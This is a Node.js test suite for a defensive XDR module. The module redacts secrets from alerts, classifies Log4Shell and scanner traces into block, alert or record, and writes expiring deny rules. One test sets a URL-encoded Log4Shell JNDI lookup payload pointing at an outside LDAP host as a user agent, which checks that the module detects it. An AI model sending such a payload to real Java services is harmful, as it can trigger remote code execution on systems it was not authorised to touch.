import assert from 'node:assert/strict';
import { mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';
import { test } from 'node:test';
import { readAlerts, extractAlert } from '../xdr/known-cve/read-alerts.mjs';
import { decide } from '../xdr/known-cve/decide.mjs';
import { respond, createXdrDecider } from '../xdr/known-cve/respond.mjs';

const fixture = JSON.parse(await readFile(new URL('../xdr/fixtures/known-cve.json', import.meta.url), 'utf8'));
const patterns = JSON.parse(await readFile(new URL('../xdr/known-cve/patterns.json', import.meta.url), 'utf8'));

test('known-cve reader preserves count, emits five fields, and redacts secrets', async () => {
  const rows = await readAlerts();
  assert.equal(rows.length, fixture.alerts.length);
  assert.deepEqual(Object.keys(rows[0]), ['timestamp', 'sourceAddress', 'account', 'level', 'description']);
  const row = extractAlert({ timestamp: fixture.alerts[0].timestamp,
    data: { srcip: '192.0.2.1', srcuser: 'user01', token: 'private-input' },
    rule: { level: 5, description: 'token=private-input password=other-private\nnext' } });
  assert(!JSON.stringify(row).includes('private-input'));
  assert(!JSON.stringify(row).includes('other-private'));
  assert(!row.description.includes('\n'));
});

test('known-cve patterns each have one-line evidence', () => {
  assert.deepEqual(patterns.patterns.map(pattern => pattern.name),
    ['log4shell_jndi_lookup', 'known_cve_scanner_trace']);
  assert(patterns.patterns.every(pattern => typeof pattern.evidence === 'string'
    && pattern.evidence.length > 0 && !/[\r\n]/.test(pattern.evidence)));
});

test('clear attacks block, ambiguous traces alert, and normal events record', () => {
  const outcomes = fixture.alerts.map(decide);
  const counts = { block: 0, alert: 0, record: 0 };
  for (let index = 0; index < outcomes.length; index += 1) {
    const value = outcomes[index];
    counts[value.action] += 1;
    assert.deepEqual(Object.keys(value), ['action', 'confidence', 'reason']);
    assert(!value.reason.includes('\n'));
    assert.deepEqual(decide({ ...fixture.alerts[index], id: 'changed-id' }), value);
  }
  assert.deepEqual(counts, { block: 8, alert: 8, record: 8 });
  assert(outcomes.slice(0, 8).every(value => value.action === 'block'));
  assert(outcomes.slice(8, 16).every(value => value.action === 'alert'));
  assert(outcomes.slice(16).every(value => value.action === 'record'));
});

test('encoded clear exploit blocks without importing another file', async () => {
  const encoded = structuredClone(fixture.alerts[0]);
  encoded.data.useragent = '%24%7Bjndi%3Aldap%3A%2F%2F203.0.113.9%2Fx%7D';
  assert.equal(decide(encoded).action, 'block');
  const dir = await mkdtemp(join(tmpdir(), 'kc-isolated-'));
  try {
    const source = await readFile(new URL('../xdr/known-cve/decide.mjs', import.meta.url), 'utf8');
    assert.doesNotMatch(source, /^\s*import\s/m);
    assert.doesNotMatch(source, /node:|readFile|writeFile|appendFile|fetch\s*\(|process\.env|setTimeout|setInterval/);
    const isolatedFile = join(dir, 'decide.mjs');
    await writeFile(isolatedFile, source, 'utf8');
    const isolated = await import(`${pathToFileURL(isolatedFile).href}?judge=1`);
    const direct = isolated.decide(fixture.alerts[0]);
    assert(!(direct instanceof Promise));
    assert.equal(direct.action, 'block');
  } finally { await rm(dir, { recursive: true, force: true }); }
});

test('known-cve responder creates only clear expiring deny rules', async () => {
  const dir = await mkdtemp(join(tmpdir(), 'kc-respond-'));
  try {
    const rulesFile = join(dir, 'rules.json');
    const alertsFile = join(dir, 'alerts.log');
    const decisions = fixture.alerts.map(alert => ({ alertId: alert.id, ...decide(alert) }));
    const at = Date.parse('2026-10-14T00:00:00.000Z');
    const rules = await respond(fixture, { decisions }, { rulesFile, alertsFile, clock: () => at });
    assert.equal(rules.length, 8);
    assert(rules.every(rule => rule.action === 'deny' && rule.alertId
      && Date.parse(rule.expiresAt) - Date.parse(rule.startsAt) === 900000));
    const lines = (await readFile(alertsFile, 'utf8')).trim().split('\n');
    assert.equal(lines.length, 8);
    assert(!lines.join('').includes('srcip'));
    const mapping = subjectId => subjectId === 'attack'
      ? { sourceAddress: fixture.alerts[0].data.srcip }
      : { sourceAddress: fixture.alerts[16].data.srcip };
    const baseDecide = async request => ({ schema: 'aleph.decision.v1', requestId: request.requestId,
      decision: 'allow', reasonCode: 'approved', ruleIds: [] });
    const overlay = createXdrDecider({ baseDecide, resolveSubject: mapping, clock: () => at + 1, rulesFile });
    const request = { schema: 'aleph.decision.v1', requestId: 'known-cve-test', subjectId: 'attack' };
    assert.equal((await overlay(request)).decision, 'deny');
    assert.equal((await overlay({ ...request, subjectId: 'normal' })).decision, 'allow');
    const ambiguous = fixture.alerts[8];
    const rejected = await respond({ alerts: [ambiguous] },
      { decisions: [{ alertId: ambiguous.id, action: 'block', confidence: 0.99, reason: 'log4shell_jndi_lookup' }] },
      { rulesFile, alertsFile, clock: () => at });
    assert.equal(rejected.length, 0);
  } finally { await rm(dir, { recursive: true, force: true }); }
});
